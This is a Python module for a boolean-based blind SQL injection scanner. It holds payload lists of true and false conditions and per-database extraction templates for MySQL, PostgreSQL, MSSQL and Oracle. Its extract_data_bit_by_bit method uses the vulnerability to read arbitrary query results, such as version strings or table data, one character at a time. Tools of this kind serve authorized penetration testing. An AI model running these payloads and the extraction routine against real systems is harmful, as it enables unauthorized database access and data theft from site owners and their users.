"""
Advanced Boolean-Based Blind SQL Injection Detector

Implements sophisticated content-based differentiation for detecting blind SQL injection
vulnerabilities through response pattern analysis.
"""

import logging
import difflib
import hashlib
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
import statistics

logger = logging.getLogger(__name__)


@dataclass
class ResponsePattern:
    """Response pattern for comparison"""
    content: str
    content_length: int
    content_hash: str
    status_code: int
    response_time: float
    headers: Dict[str, str]


class BooleanBlindDetector:
    """
    Advanced detector for boolean-based blind SQL injection using
    content differentiation and pattern analysis.
    """
    
    # Boolean-based payloads for different scenarios
    BOOLEAN_PAYLOADS = {
        'numeric': [
            # True conditions
            {'payload': ' AND 1=1', 'expected': 'true'},
            {'payload': ' AND 2=2', 'expected': 'true'},
            {'payload': ' AND 5=5', 'expected': 'true'},
            # False conditions
            {'payload': ' AND 1=2', 'expected': 'false'},
            {'payload': ' AND 1=0', 'expected': 'false'},
            {'payload': ' AND 5=6', 'expected': 'false'},
        ],
        'string': [
            # True conditions
            {"payload": "' AND 'a'='a", 'expected': 'true'},
            {"payload": "' AND 'x'='x", 'expected': 'true'},
            {"payload": "' AND '1'='1", 'expected': 'true'},
            # False conditions
            {"payload": "' AND 'a'='b", 'expected': 'false'},
            {"payload": "' AND 'x'='y", 'expected': 'false'},
            {"payload": "' AND '1'='2", 'expected': 'false'},
        ],
        'advanced': [
            # Database-specific true conditions
            {'payload': "' AND (SELECT 'a' FROM dual)='a'--", 'expected': 'true'},  # Oracle
            {'payload': "' AND SUBSTRING(@@version,1,1)=SUBSTRING(@@version,1,1)--", 'expected': 'true'},  # MySQL/MSSQL
            {'payload': "' AND LENGTH('a')=1--", 'expected': 'true'},  # MySQL/PostgreSQL
            # Database-specific false conditions
            {'payload': "' AND (SELECT 'a' FROM dual)='b'--", 'expected': 'false'},  # Oracle
            {'payload': "' AND SUBSTRING(@@version,1,1)='z'--", 'expected': 'false'},  # MySQL/MSSQL
            {'payload': "' AND LENGTH('a')=99--", 'expected': 'false'},  # MySQL/PostgreSQL
        ]
    }
    
    # Extraction payloads for data retrieval
    EXTRACTION_TEMPLATES = {
        'mysql': {
            'char_extraction': "' AND SUBSTRING({column},{position},1)='{char}'--",
            'length_check': "' AND LENGTH({column})={length}--",
            'exists_check': "' AND EXISTS(SELECT 1 FROM {table} WHERE {condition})--",
        },
        'postgresql': {
            'char_extraction': "' AND SUBSTRING({column},{position},1)='{char}'--",
            'length_check': "' AND LENGTH({column})={length}--",
            'exists_check': "' AND EXISTS(SELECT 1 FROM {table} WHERE {condition})--",
        },
        'mssql': {
            'char_extraction': "' AND SUBSTRING({column},{position},1)='{char}'--",
            'length_check': "' AND LEN({column})={length}--",
            'exists_check': "' AND EXISTS(SELECT 1 FROM {table} WHERE {condition})--",
        },
        'oracle': {
            'char_extraction': "' AND SUBSTR({column},{position},1)='{char}'--",
            'length_check': "' AND LENGTH({column})={length}--",
            'exists_check': "' AND EXISTS(SELECT 1 FROM {table} WHERE {condition})--",
        },
    }
    
    def __init__(self, similarity_threshold: float = 0.95, confidence_threshold: float = 0.9):
        """
        Initialize boolean blind detector.
        
        Args:
            similarity_threshold: Threshold for content similarity (0.0-1.0)
            confidence_threshold: Minimum confidence for positive detection
        """
        self.similarity_threshold = similarity_threshold
        self.confidence_threshold = confidence_threshold
        self.baseline_responses = {}
        self.true_responses = []
        self.false_responses = []
        
    def analyze_response(self, response, response_time: float = 0.0) -> ResponsePattern:
        """
        Analyze and create pattern from response.
        
        Args:
            response: HTTP response object
            response_time: Response time in seconds
        
        Returns:
            ResponsePattern object
        """
        content = response.text if hasattr(response, 'text') else str(response)
        content_hash = hashlib.md5(content.encode()).hexdigest()
        
        return ResponsePattern(
            content=content,
            content_length=len(content),
            content_hash=content_hash,
            status_code=response.status_code if hasattr(response, 'status_code') else 200,
            response_time=response_time,
            headers=dict(response.headers) if hasattr(response, 'headers') else {}
        )
    
    def calculate_similarity(self, pattern1: ResponsePattern, pattern2: ResponsePattern) -> float:
        """
        Calculate similarity between two response patterns.
        
        Args:
            pattern1: First response pattern
            pattern2: Second response pattern
        
        Returns:
            Similarity score (0.0-1.0)
        """
        # Multiple similarity factors
        factors = []
        
        # Content hash comparison (exact match)
        if pattern1.content_hash == pattern2.content_hash:
            factors.append(1.0)
        else:
            # Content similarity using difflib
            similarity = difflib.SequenceMatcher(
                None, 
                pattern1.content, 
                pattern2.content
            ).ratio()
            factors.append(similarity)
        
        # Length similarity
        max_len = max(pattern1.content_length, pattern2.content_length)
        min_len = min(pattern1.content_length, pattern2.content_length)
        length_similarity = min_len / max_len if max_len > 0 else 1.0
        factors.append(length_similarity)
        
        # Status code comparison
        status_match = 1.0 if pattern1.status_code == pattern2.status_code else 0.0
        factors.append(status_match)
        
        # Weighted average
        return statistics.mean(factors)
    
    def establish_baseline(self, base_response, base_response_time: float = 0.0) -> ResponsePattern:
        """
        Establish baseline response pattern.
        
        Args:
            base_response: Normal response without injection
            base_response_time: Response time
        
        Returns:
            Baseline response pattern
        """
        baseline = self.analyze_response(base_response, base_response_time)
        self.baseline_responses['normal'] = baseline
        logger.info(f"Baseline established: length={baseline.content_length}, hash={baseline.content_hash[:8]}")
        return baseline
    
    def test_boolean_injection(self, test_function, url: str, param: str, 
                               param_type: str, **kwargs) -> Dict[str, Any]:
        """
        Test for boolean-based blind SQL injection.
        
        Args:
            test_function: Function to make test requests
            url: Target URL
            param: Parameter to test
            param_type: Parameter type (GET/POST)
            **kwargs: Additional request parameters
        
        Returns:
            Detection results dictionary
        """
        results = {
            'vulnerable': False,
            'confidence': 0.0,
            'method': 'boolean_blind',
            'evidence': [],
            'true_pattern': None,
            'false_pattern': None,
            'differentiation_score': 0.0,
        }
        
        logger.info(f"Testing boolean-based blind injection on parameter: {param}")
        
        # Establish baseline if not already done
        if 'normal' not in self.baseline_responses:
            logger.warning("No baseline established, skipping")
            return results
        
        baseline = self.baseline_responses['normal']
        
        # Test with true and false conditions
        true_patterns = []
        false_patterns = []
        
        # Try different payload types
        for payload_type in ['numeric', 'string', 'advanced']:
            payloads = self.BOOLEAN_PAYLOADS.get(payload_type, [])
            
            for payload_info in payloads:
                payload = payload_info['payload']
                expected = payload_info['expected']
                
                try:
                    # Make request with payload
                    response = test_function(payload, param, param_type, **kwargs)
                    if not response:
                        continue
                    
                    pattern = self.analyze_response(response)
                    
                    # Categorize responses
                    if expected == 'true':
                        true_patterns.append(pattern)
                    else:
                        false_patterns.append(pattern)
                    
                except Exception as e:
                    logger.debug(f"Payload test failed: {e}")
                    continue
        
        if not true_patterns or not false_patterns:
            logger.info("Insufficient responses for boolean analysis")
            return results
        
        # Analyze patterns
        true_avg_len = statistics.mean([p.content_length for p in true_patterns])
        false_avg_len = statistics.mean([p.content_length for p in false_patterns])
        
        # Check if true responses are similar to each other
        true_similarity = self._calculate_group_similarity(true_patterns)
        false_similarity = self._calculate_group_similarity(false_patterns)
        
        # Check if true and false responses are different
        cross_similarity = self._calculate_cross_similarity(true_patterns, false_patterns)
        
        logger.info(f"True group similarity: {true_similarity:.2f}")
        logger.info(f"False group similarity: {false_similarity:.2f}")
        logger.info(f"Cross-group similarity: {cross_similarity:.2f}")
        
        # Differentiation score
        differentiation = 1.0 - cross_similarity
        
        # Detection logic
        if (true_similarity > self.similarity_threshold and 
            false_similarity > self.similarity_threshold and
            differentiation > 0.3):  # At least 30% different
            
            results['vulnerable'] = True
            results['confidence'] = min(differentiation, true_similarity, false_similarity)
            results['differentiation_score'] = differentiation
            results['true_pattern'] = {
                'avg_length': true_avg_len,
                'count': len(true_patterns),
                'similarity': true_similarity
            }
            results['false_pattern'] = {
                'avg_length': false_avg_len,
                'count': len(false_patterns),
                'similarity': false_similarity
            }
            
            self.true_responses = true_patterns
            self.false_responses = false_patterns
            
            results['evidence'].append({
                'description': 'Boolean differentiation detected',
                'true_length': true_avg_len,
                'false_length': false_avg_len,
                'differentiation': differentiation,
            })
            
            logger.info(f"✓ Boolean-based blind SQLi detected! Confidence: {results['confidence']:.2f}")
        else:
            logger.info("No clear boolean differentiation detected")
        
        return results
    
    def extract_data_bit_by_bit(self, test_function, url: str, param: str,
                               param_type: str, query: str, db_type: str = 'mysql',
                               max_length: int = 100, **kwargs) -> Optional[str]:
        """
        Extract data using bit-by-bit (character-by-character) boolean technique.
        
        Args:
            test_function: Function to make test requests
            url: Target URL
            param: Vulnerable parameter
            param_type: Parameter type
            query: SQL query to extract (e.g., '@@version', 'database()')
            db_type: Database type
            max_length: Maximum length to extract
            **kwargs: Additional parameters
        
        Returns:
            Extracted data or None
        """
        if not self.true_responses or not self.false_responses:
            logger.warning("No boolean patterns established")
            return None
        
        logger.info(f"Starting bit-by-bit extraction for: {query}")
        
        templates = self.EXTRACTION_TEMPLATES.get(db_type, self.EXTRACTION_TEMPLATES['mysql'])
        charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-@:/() '
        
        extracted = ""
        
        for position in range(1, max_length + 1):
            found_char = None
            
            for char in charset:
                # Build extraction payload
                if db_type == 'mysql':
                    payload = f"' AND SUBSTRING(({query}),{position},1)='{char}'--"
                elif db_type == 'postgresql':
                    payload = f"' AND SUBSTRING(({query}),{position},1)='{char}'--"
                elif db_type == 'mssql':
                    payload = f"' AND SUBSTRING(({query}),{position},1)='{char}'--"
                elif db_type == 'oracle':
                    payload = f"' AND SUBSTR(({query}),{position},1)='{char}'--"
                else:
                    payload = f"' AND SUBSTRING(({query}),{position},1)='{char}'--"
                
                try:
                    response = test_function(payload, param, param_type, **kwargs)
                    if not response:
                        continue
                    
                    pattern = self.analyze_response(response)
                    
                    # Check if response matches "true" pattern
                    matches_true = any(
                        self.calculate_similarity(pattern, true_p) > self.similarity_threshold
                        for true_p in self.true_responses
                    )
                    
                    if matches_true:
                        found_char = char
                        break
                
                except Exception as e:
                    logger.debug(f"Extraction failed for char '{char}': {e}")
                    continue
            
            if found_char:
                extracted += found_char
                logger.info(f"Extracted: {extracted}")
            else:
                # No more characters
                break
        
        logger.info(f"Extraction complete: {extracted}")
        return extracted if extracted else None
    
    def _calculate_group_similarity(self, patterns: List[ResponsePattern]) -> float:
        """Calculate average similarity within a group of patterns."""
        if len(patterns) < 2:
            return 1.0
        
        similarities = []
        for i in range(len(patterns)):
            for j in range(i + 1, len(patterns)):
                sim = self.calculate_similarity(patterns[i], patterns[j])
                similarities.append(sim)
        
        return statistics.mean(similarities) if similarities else 0.0
    
    def _calculate_cross_similarity(self, patterns1: List[ResponsePattern], 
                                   patterns2: List[ResponsePattern]) -> float:
        """Calculate average similarity between two groups."""
        if not patterns1 or not patterns2:
            return 0.0
        
        similarities = []
        for p1 in patterns1:
            for p2 in patterns2:
                sim = self.calculate_similarity(p1, p2)
                similarities.append(sim)
        
        return statistics.mean(similarities) if similarities else 0.0
    
    def generate_report(self) -> str:
        """Generate report for boolean-based blind detection."""
        report = []
        report.append("=" * 60)
        report.append("BOOLEAN-BASED BLIND SQL INJECTION REPORT")
        report.append("=" * 60)
        
        if self.true_responses and self.false_responses:
            report.append("\n[✓] Boolean Differentiation Detected")
            report.append(f"True Responses: {len(self.true_responses)}")
            report.append(f"False Responses: {len(self.false_responses)}")
            
            true_avg = statistics.mean([p.content_length for p in self.true_responses])
            false_avg = statistics.mean([p.content_length for p in self.false_responses])
            
            report.append(f"\nAverage True Response Length: {true_avg:.0f}")
            report.append(f"Average False Response Length: {false_avg:.0f}")
            report.append(f"Difference: {abs(true_avg - false_avg):.0f} bytes")
            
            cross_sim = self._calculate_cross_similarity(self.true_responses, self.false_responses)
            report.append(f"\nDifferentiation Score: {(1.0 - cross_sim):.2%}")
        else:
            report.append("\n[✗] No Boolean Differentiation Detected")
        
        report.append("=" * 60)
        return "\n".join(report)
